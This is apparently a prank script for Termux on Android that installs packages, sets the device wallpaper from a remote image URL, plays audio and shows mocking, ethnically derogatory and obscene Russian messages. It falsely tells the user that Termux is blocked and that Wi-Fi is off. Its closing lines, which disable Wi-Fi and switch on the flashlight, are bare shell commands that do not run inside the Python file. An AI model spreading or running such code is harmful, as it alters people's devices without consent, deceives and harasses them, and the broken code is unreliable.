import os
os.system('clear')
os.system('pkg install mpv')
os.system('apt install termux-api')
os.system("clear")
print("Заскамили москаля")
os.system('termux-wallpaper -u https://i.pinimg.com/736x/5d/03/48/5d034835ae769491ae25b4745069cdd9.jpg')
os.system('termux-toast "Слава Украине!"')
os.system('mpv 1462a1b7ae0a.mp3')
print("Термукс заблокирован, Wi-Fi отключён, фонарик включён, пока.")
termux-wifi-enable false
termux-torch true
termux-toast "Заскамлен нахуй)"
termux-tts-speak
